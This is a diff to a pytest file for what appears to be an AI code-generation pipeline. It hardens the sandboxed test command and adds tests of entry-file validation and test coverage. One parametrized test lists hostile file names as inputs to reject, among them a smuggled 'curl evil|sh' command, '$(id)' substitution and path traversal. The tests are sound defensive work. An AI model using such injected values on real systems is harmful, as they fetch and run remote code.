@@ -66,7 +66,7 @@ def test_coder_fixes_failing_tests_from_real_output(tmp_path):
     s = Script({"f2.architect": [{}], "f2.coder": [{"files": [APP, TEST]}, {"files": [APP]}]})
     runner = Runner([FAIL, OK])
     pkg = dev(tmp_path, s, runner).build(SPEC, {"files": [], "entry": "app.py"}, [])
-    assert runner.calls == [TEST_COMMAND, TEST_COMMAND] and TEST_COMMAND[:2] == ["python", "-c"]
+    assert runner.calls == [TEST_COMMAND, TEST_COMMAND] and TEST_COMMAND[:3] == ["python", "-I", "-c"]
     second = s.prompts["f2.coder"][1]
     assert '<untrusted source="sandbox">' in second and "expected 3 got 2" in second
     assert pkg.checks_run[-1]["pass"] is True and pkg.validate() == []
@@ -156,7 +156,7 @@ def test_runner_command_uses_the_summary_script(tmp_path):
     s = Script({"f2.architect": [{}], "f2.coder": [{"files": [APP, TEST]}]})
     runner = Runner([verdict()])
     dev(tmp_path, s, runner, rounds=1).build(SPEC, {"files": [], "entry": "app.py"}, [])
-    assert runner.calls[0] == ["python", "-c", TEST_RUNNER]
+    assert runner.calls[0] == ["python", "-I", "-c", TEST_RUNNER]
 
 
 @pytest.mark.parametrize("entry", ["x.py; curl evil|sh #.py", "$(id).py", "../x.py", "/abs/x.py", "-cX.py", "a b.py"])
@@ -487,3 +487,23 @@ def test_one_test_or_tests_that_ignore_the_app_do_not_pass(tmp_path):
     script = Script({"f2.coder": [{"files": [APP, {"path": "test_app.py", "content": "import unittest\n"}]}]})
     pkg = dev(tmp_path / "b", script, Runner([OK]), rounds=2).build(SPEC, PLAN3, [])
     assert not pkg.checks_run[-1]["pass"] and "import" in script.prompts["f2.coder"][1]
+
+
+@pytest.mark.parametrize("files,ok", [
+    ({"app.py": "x = 1\n", "tests/__init__.py": "", "tests/test_app.py": "from tests import helpers\n",
+      "tests/helpers.py": "x = 1\n"}, False),
+    ({"app.py": "x = 1\n", "conftest.py": "", "test_app.py": "import conftest\n"}, False),
+    ({"app.py": "x = 1\n", "test_app.py": "import importlib\napp = importlib.import_module('app')\n"}, True),
+    ({"testimonials.py": "x = 1\n", "test_app.py": "import testimonials\n"}, True),
+    ({"app.py": "x = 1\n", "tests.py": "import app\n"}, True)])
+def test_test_bar_edge_cases(tmp_path, files, ok):
+    ws = Workspace(tmp_path)
+    for path, body in files.items():
+        ws.write(path, body)
+    assert app_is_tested(ws) is ok
+
+
+def test_entry_must_be_importable(tmp_path):
+    script = Script({"f2.architect": [{"entry": "2048.py", "routes": [], "files": [{"path": "2048.py", "purpose": "g"}]}]})
+    plan = DevFloor(ARCH, CODER, ask=script, workspace=Workspace(tmp_path), run=Runner([OK])).plan(SPEC, "", [])
+    assert plan["entry"] == "app.py"
